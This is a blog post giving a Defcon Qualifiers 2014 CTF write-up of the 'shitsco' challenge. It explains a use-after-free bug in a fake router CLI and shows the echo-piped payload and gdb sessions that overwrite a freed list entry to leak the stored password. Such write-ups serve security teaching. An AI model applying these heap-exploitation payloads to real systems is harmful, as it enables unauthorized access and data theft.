---
id: 1909
title: 'Defcon Quals writeup for Shitsco (use-after-free vuln)'
date: '2014-05-21T11:33:27-05:00'
author: ron
layout: post
guid: 'https://blog.skullsecurity.org/?p=1909'
permalink: /2014/defcon-quals-writeup-for-shitsco-use-after-free-vuln
categories:
    - defcon-quals-2014
    - hacking
---

Hey folks,

Apparently this blog has become a CTF writeup blog! Hopefully you don't mind, I still try to keep all my posts educational.

Anyway, this is the first of two writeups for the Defcon CTF Qualifiers (2014). I only completed two levels, both of which were binary reversing/exploitation! This particular level was called "shitsco", and was essentially a use-after-free vulnerability. You can download the level, as well as my annotated IDA file, <a href='https://github.com/iagox86/defcon-ctf-2014/tree/master/shitsco'>here</a>.
<!--more-->
<h2>The setup</h2>

Based on the name, it'll be no surprise that the program itself looks like a Cisco router UI. You run the executable, and it prints stuff to stdout:

<pre>
$ <strong>./shitsco</strong>

 oooooooo8 oooo        o88    o8
888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo
 888oooooo  888   888   888  888   888ooooooo  888     888 888     888
        888 888   888   888  888           888 888         888     888
o88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88

Welcome to Shitsco Internet Operating System (IOS)
For a command list, enter ?
$ ?
==========Available Commands==========
|enable                               |
|ping                                 |
|tracert                              |
|?                                    |
|shell                                |
|set                                  |
|show                                 |
|credits                              |
|quit                                 |
======================================
Type ? followed by a command for more detailed information
</pre>

You can do a lot of interesting stuff, but the most interesting things are:

<ul>
  <li>enable - prompts for a password to elevate privileges (and matches it to the password in /home/shitsco/password, which is read (<em>and stored in memory</em> - this is important later) when the program executes)</li>
  <li>set - sets and unsets named variables</li>
  <li>show - shows variables that have been set</li>
  <li>flag - a hidden command that can be run after 'enable' that prints out the flag</li>
</ul>

I started by reversing a lot of the commands. I won't go into too much detail on the assembly here, but suffice to say that many of the commands are boring ("credits", "quit", "shell", and "?" for example), and some are somewhat interesting ("ping" and "tracert", for example, let you provide a single command-line argument to the ping and traceroute programs respectively). But since exec() was being used, there was no shell injection issue. I spent some time reading the manpage for ping and tracert to see if there was any way I could get them to read from a file, but I didn't see anything (since they're setuid, the likelihood of having a real issue at this point should be pretty low).

One of my first suspicions was the set/unset functionality, because heap overflow / linked list issues are <a href='/2014/ghost-in-the-shellcode-gitsmsg-pwnage-299'>so</a> damn <a href='/2014/plaidctf-writeup-for-pwnage-200-a-simple-overflow-bug'>common</a> in CTFs. It turns out that wasn't the issue, but the issue was indeed in the set/unset functionality!

<h2>Playing with the binary</h2>

The first thing I noticed was weird behaviour when I set and unset stuff. Here is how it should look:

<pre>
$ <strong>./shitsco</strong>
 oooooooo8 oooo        o88    o8
888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo
 888oooooo  888   888   888  888   888ooooooo  888     888 888     888
        888 888   888   888  888           888 888         888     888
o88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88

$ <strong>set a aaa</strong>
$ <strong>set b bbb</strong>
$ <strong>set c ccc</strong>
$ <strong>show</strong>
a: aaa
b: bbb
c: ccc
$ <strong>set b</strong> &lt;-- Unset 'b'
$ <strong>show</strong>
a: aaa
c: ccc
$ <strong>set c</strong> &lt;-- Unset 'c'
$ <strong>show</strong>
a: aaa
$ <strong>set d ddd</strong>
$ <strong>set e eee</strong>
$ <strong>show</strong>
a: aaa
d: ddd
e: eee
</pre>

Note that as we add to the list, they are sorted top to bottom. When you remove them from the list, they are no longer shown (obviously). When you add more stuff to the list, it keeps adding to the bottom. That's expected!

But look at what happens if we free 'a' and add something else:

<pre>
$ <strong>./shitsco</strong>

 oooooooo8 oooo        o88    o8
888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo
 888oooooo  888   888   888  888   888ooooooo  888     888 888     888
        888 888   888   888  888           888 888         888     888
o88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88

$ <strong>set a aaa</strong>
$ <strong>set b bbb</strong>
$ <strong>show</strong>
a: aaa
b: bbb
$ <strong>set a</strong>
$ <strong>show</strong>
b: bbb
$ <strong>set c ccc</strong>
$ <strong>show</strong>
c: ccc
b: bbb
</pre>

Wait a minute... how did 'ccc' wind up at the top of the list? What happens if we add something else?

<pre>
$ <strong>set d ddd</strong>
$ <strong>show</strong>
c: ccc
b: bbb
d: ddd
</pre>

It adds to the... end?

We're starting to see some odd behaviour! Let's look at another weird case:

<pre>
$ ./shitsco

 oooooooo8 oooo        o88    o8
888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo
 888oooooo  888   888   888  888   888ooooooo  888     888 888     888
        888 888   888   888  888           888 888         888     888
o88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88

$ <strong>set a aaa</strong>
$ <strong>set b bbb</strong>
$ <strong>set c ccc</strong>
$ <strong>show</strong>
a: aaa
b: bbb
c: ccc
$ <strong>set c 321</strong> &lt;-- edit 'c'
$ <strong>show</strong>
a: aaa
b: bbb
c: 321
$ <strong>set a</strong>
$ <strong>show</strong>
b: bbb
c: ccc
$ <strong>set b 123</strong> &lt;-- edit 'b'.. or not?
$ <strong>show</strong>
b: 123
b: bbb
c: ccc
</pre>

We were able to end up with two 'b' entries... that's not right!

I'll show you one more odd example:

<pre>
$ ./shitsco

 oooooooo8 oooo        o88    o8
888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo
 888oooooo  888   888   888  888   888ooooooo  888     888 888     888
        888 888   888   888  888           888 888         888     888
o88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88

$ <strong>set a aaa</strong>
$ <strong>set b bbb</strong>
$ <strong>set c ccc</strong>
$ <strong>set a</strong>
$ <strong>set b</strong>
$ <strong>set c</strong>
$ <strong>show</strong>
?: (null)
$ <strong>show</strong>
d: ddd
?: (null)
$ <strong>set e eee</strong>
$ <strong>show</strong>
d: ddd
e: eee
e: eee
e: eee
e: eee
e: eee
...forever
</pre>

That's the weirdest one! We got a 'null' in the list, and we wound up in an infinite loop!

Something I should have noticed, but didn't at the time, was that this odd behaviour only happens when a) you remove the first element, and b) there was at least one element after it. Quite honestly, I was never able to reliably figure out how to trigger the odd behaviour till I started reversing.

<h2>The vulnerability</h2>

Before we get to the actual vulnerability, let's talk a bit about the architecture of the code.

Without whipping out the disassembler just yet, we can assume that this is implemented with a linked list. Why? Because we were able to get an infinite loop, which means something is pointing back at itself.

In actuality, the code bears out. It is indeed a linked list (a doubly-linked list, in fact) with four fields:

<pre id='vimCodeElement'>
<span class="Type">typedef</span> <span class="Type">struct</span> {
  <span class="Type">char</span> *name;
  <span class="Type">char</span> *value;
  <span class="Type">void</span> *prev;
  <span class="Type">void</span> *next;
}
</pre>

When you add a new entry, there is only one possibility: it walks the list to the end, then sets the 'next' pointer appropriately.

When you remove an entry, there are three possibilities: the end of the list, the middle, or the start. The code for doing this is extremely confusing, but the three things that can happen are:

End of the list: it frees it and sets the previous pointer's 'next' to NULL. Note that if there's only one entry, this always happens!

Middle of the list: it frees it, and sets the previous next and next previous pointers appropriately

Beginning of the list: it frees it, and fails to set the 'previous' pointer properly. <strong>The <em>head</em> pointer still points to the freed memory</strong>!  That leads directly to a <strong>use after free</strong> vulnerability!

When we remove the first entry (freeing 16 bytes) then add a new one (which requires 16 bytes), the new entry just happens to get allocated in the same memory where the first entry used to be, and everything works just fine. However, if 16 bytes gets allocated in the interim, and we control those bytes, it means we can fully control the 'head' entry!

One gotcha: The data for the two entries needs to be 16 bytes long in order for this attack to work out. I discovered by trial and error, and it's simply the nature of how the malloc()s and free()s are ordered, as well as the size of the entry structure (which is also 16 bytes). I'm sure there are other ways to arrange things, of course, this is the fun of heap attacks!

<h2>The exploit</h2>

Let's first try a proof-of-concept: we'll make it allocate 16 'A's, which in theory should take the place of the freed structure:

<pre>
 oooooooo8 oooo        o88    o8
888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo
 888oooooo  888   888   888  888   888ooooooo  888     888 888     888
        888 888   888   888  888           888 888         888     888
o88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88

Welcome to Shitsco Internet Operating System (IOS)
For a command list, enter ?
$ <strong>set a aaaaaaaaaaaaaaaa</strong>
$ <strong>set b bbbbbbbbbbbbbbbb</strong>
$ <strong>set a</strong>
$ <strong>set b</strong>
$ <strong>set c AAAAAAAAAAAAAAAA</strong>
$ <strong>show</strong>
c: AAAAAAAAAAAAAAAA
Segmentation fault
</pre>

Beautiful! We added 'aaaaaaaaaaaaaaaa' and 'bbbbbbbbbbbbbbbb', then freed them both (as I mentioned earlier, we have to empty out the list). Then we add 'c' with the value of 'AAAAAAAAAAAAAAAA', which should take over the memory that the list's 'head' points to. We, therefore, expect that the name, the value, the previous, and the next pointers all point to 0x41414141, so it's crashing when trying to dereference one of them.

And sure enough, we can verify with a debugger (I used a string with four different values so we can see what's happening):

<pre>
$ gdb -q ./shitsco
Reading symbols from /home/ron/defcon-ctf-2014/shitsco/shitsco...(no debugging symbols found)...done.
(gdb) run
Starting program: /home/ron/defcon-ctf-2014/shitsco/./shitsco

 oooooooo8 oooo        o88    o8
888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo
 888oooooo  888   888   888  888   888ooooooo  888     888 888     888
        888 888   888   888  888           888 888         888     888
o88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88

Welcome to Shitsco Internet Operating System (IOS)
For a command list, enter ?
$ <strong>set a aaaaaaaaaaaaaaaa</strong>
$ <strong>set b bbbbbbbbbbbbbbbb</strong>
$ <strong>set a</strong>
$ <strong>set b</strong>
$ <strong>set c AAAABBBBCCCCDDDD</strong>
$ <strong>show</strong>
c: AAAABBBBCCCCDDDD

Program received signal SIGSEGV, Segmentation fault.
<span class="Constant">0x08048e98</span> in ?? ()
(gdb) x/i <span class="Identifier">$eip</span>
=&gt; <span class="Constant">0x8048e98</span>:   mov    eax,DWORD PTR [ebx]
(gdb) <span class="Constant">print</span>/x <span class="Identifier">$ebx</span>
$1 = <span class="Constant">0x43434343</span>
</pre>

Excellent! It's crashing when reading the 'next' pointer! That means we need to construct an appropriate struct in memory that we can point to. Or... we can just use the 'head' entry, which happens to be at 0x0804C36C. This will cause an infinite loop, but I'm okay with that.

I'm sick of typing manually, plus we want to start using some non-ascii characters, so let's do it all on the commandline:

<pre>
$ echo -ne <span class="Constant">'set a aaaaaaaaaaaaaaaa\nset b bbbbbbbbbbbbbbbb\nset a\nset b\nset c AAAABBBB\x6c\xc3\x04\x08DDDD\nshow\n'</span> | ./shitsco

 oooooooo8 oooo        o88    o8
888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo
 888oooooo  888   888   888  888   888ooooooo  888     888 888     888
        888 888   888   888  888           888 888         888     888
o88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88

Welcome to Shitsco Internet Operating System (IOS)
For a command list, enter ?
$ $ $ $ $ $ c: AAAABBBBlDDDD
Segmentation fault (core dumped)
</pre>

Using a debugger to check out the crash:

<pre>
$ gdb -q ./shitsco ./core
Reading symbols from /home/ron/defcon-ctf-2014/shitsco/shitsco...(no debugging symbols found)...done.

Core was generated by `./shitsco'.
Program terminated with signal <span class="Constant">11</span>, Segmentation fault.
<span class="Comment">#0  0xf75e2b75 in vfprintf () from /lib32/libc.so.6</span>
(gdb) x/i <span class="Identifier">$eip</span>
=&gt; <span class="Constant">0xf75e2b75</span> &lt;vfprintf+<span class="Constant">21189</span>&gt;: repnz scas al,BYTE PTR es:[edi]
(gdb) <span class="Constant">print</span>/x <span class="Identifier">$edi</span>
$1 = <span class="Constant">0x42424242</span>
</pre>

We can see from this that it crashed in vfprintf() while reading 0x42424242 - that's "BBBB". Sweet!

Now the last step: I want to read the password, so I can use 'enable'. So I set the commandline to 0x0804C3A0, which is the address of the password in memory. I also pipe into "head" because it causes an infinite loop:

<pre>
$ echo -ne 'set a aaaaaaaaaaaaaaaa\nset b bbbbbbbbbbbbbbbb\nset a\nset b\nset c AAAA\xa0\xc3\x04\x08\x6c\xc3\x04\x08DDDD\nshow\n' | ./shitsco | head -n12

 oooooooo8 oooo        o88    o8
888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo
 888oooooo  888   888   888  888   888ooooooo  888     888 888     888
        888 888   888   888  888           888 888         888     888
o88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88

Welcome to Shitsco Internet Operating System (IOS)
For a command list, enter ?
$ $ $ $ $ $ c: AAAA?lDDDD
: this_is_the_password
</pre>

We got the password!! From there, all you have to do is use 'enable', then 'flag' to get the flag.

<h2>Summary</h2>

Essentially, this was a use-after-free bug. If you de-allocated the first entry, the 'head' pointer wasn't updated and still pointed at freed memory. If you can allocate new memory of the same size, it'll take the place of the head structure and give the attacker some control over the name, value, next, and previous pointers. In theory, we could almost certainly use this for an arbitrary memory write, but in the context of this challenge it's enough to read the password from memory.

This is the first time I've seen a use-after-free issue in a CTF, so it was really cool to see it!
